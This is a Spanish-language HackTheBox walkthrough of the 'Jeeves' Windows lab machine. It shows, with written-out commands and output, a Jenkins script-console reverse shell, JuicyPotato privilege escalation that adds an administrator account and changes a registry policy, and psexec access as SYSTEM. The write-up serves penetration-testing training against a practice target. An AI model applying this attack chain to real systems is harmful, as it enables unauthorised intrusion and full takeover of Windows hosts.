---
title: HTB - Jeeves
published: true
categories: [Windows]
tags: [eJPT, eWPT, OSCP, Media]
---

<img src="/assets/HTB/Jeeves/jeeves.png">

¡Hola!
Vamos a resolver de la máquina `Jeeves` de dificultad "Media" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Jenkins Exploitation (Groovy Script Console)**
- **RottenPotato (SeImpersonatePrivilege)**
- **PassTheHash (Psexec)**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Jeeves`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.63
PING 10.10.10.63 (10.10.10.63) 56(84) bytes of data.
64 bytes from 10.10.10.63: icmp_seq=1 ttl=127 time=38.3 ms

--- 10.10.10.64 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.334/38.334/38.334/0.000 ms
```
Identificamos que es una maquina **Windows** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```ruby
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.63 -oG allPorts

PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
50000/tcp open  ibm-db2      syn-ack ttl 127
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p80,135,445,50000 10.10.10.63 -oN targeted

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-12-11T20:31:04
|_  start_date: 2022-12-11T20:27:30
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 5h00m00s, deviation: 0s, median: 5h00m00s
```


### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://10.10.10.63
http://10.10.10.63 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.63], Microsoft-IIS[10.0], Title[Ask Jeeves]
❯ whatweb http://10.10.10.63:50000
http://10.10.10.63:50000 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.z-SNAPSHOT)], IP[10.10.10.63], Jetty[9.4.z-SNAPSHOT], PoweredBy[Jetty://], Title[Error 404 Not Found]
```

Accedemos al servicio web por el puerto 80 y 50000. Inicialmente ninguno de los dos sitios dispone de funcionalidad

<img src="/assets/HTB/Jeeves/web.png">

<img src="/assets/HTB/Jeeves/50000.png">

Seguimos aplicando fuzzing en busca de posibles directorios

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.63:50000/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.63:50000/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000041593:   302        0 L      0 W        0 Ch        "askjeeves"
```

Enumerando directorios en el puerto 50000 encontramos un directorio `askjeeves`. Accedemos y nos encontramos un panel de control de `Jenkins`

<img src="/assets/HTB/Jeeves/askjeeves.png">

Buscando posibles vulnerabilidades enontramos este artículo de [Hacking Articles](https://www.hackingarticles.in/exploiting-jenkins-groovy-script-console-in-multiple-ways/) en donde explican como ejecutar una reverse shell a través de la consola de scripts. Accedemos a `Manage Jenkins -> Script Console`, insertamos el código para entablar una reverse shell y nos ponemos en escucha en el puerto 443 

<img src="/assets/HTB/Jeeves/script.png">

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.10.63] from (UNKNOWN) [10.10.10.63] 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>whoami
whoami
jeeves\kohsuke
```
La flag de usuario la encontramos en el directorio `C:\Users\kohsuke\Desktop`

```bash
C:\Users\kohsuke\Desktop>type user.txt
type user.txt
e3232272596fb4795***************
```

### Escalada Privilegios

* * *

Enumerando privilegios de usario `kohsuke` vemos que pertenece al grupo `SeImpersonatePrivilege`. Enseguida nos viene a la cabeza `JuicyPotato`

```bash
C:\Users\kohsuke\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

Nos dirigimos al GitHub de [ohpe](https://github.com/ohpe/juicy-potato) y nos decargamos el binario compilado `JuicyPotato.exe` y lo subimos a la máquina víctima. Primero creamos un usuario

```bash
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user yorch yorch123 /add" -l 1337
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

net user
net user

User accounts for \\JEEVES

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
kohsuke                  yorch                    
The command completed successfully.
```

A continuación agregamos el usuario creado al grupo `Administrators`

```bash
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators yorch /add" -l 1337
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators yorch /add" -l 1337
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```
Como último paso debemos modificar el registro de `LocalAccountTokenFilterPolicy` de la siguiente forma

```bash
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

Con la herramienta `crackmapexec` comprobamos que el usuario creado tiene máximos privilegios

```bash
❯ crackmapexec smb 10.10.10.63 -u 'yorch' -p 'yorch123'
SMB         10.10.10.63    445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63    445    JEEVES           [+] Jeeves\yorch:yorch123 (Pwn3d!)
```

Con la herramienta `psexec.py` procedemos a conectarnos a la máquina víctima con privilegios máximos

```bash
❯ /usr/share/doc/python3-impacket/examples/psexec.py WORKGROUP/yorch@10.10.10.63 cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file lnolJuMJ.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service FKJn on 10.10.10.63.....
[*] Starting service FKJn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

Nos dirigimos al directorio `Desktop` del usuario `Administrator` para buscar la flag

```bash
C:\Users\Administrator\Desktop>type hm.txt
The flag is elsewhere.  Look deeper.
```

Vaya parece que no está aquí, vamos a buscar más detenidamente

```bash
C:\Users\Administrator\Desktop>powershell Get-Content -Path "hm.txt" -Stream "root.txt"
afbc5bd4b615a6064***************
```

Hemos completado la máquina **Jeeves** de HackTheBox!! Happy Hacking!!

<img src="/assets/HTB/Jeeves/pwned.png">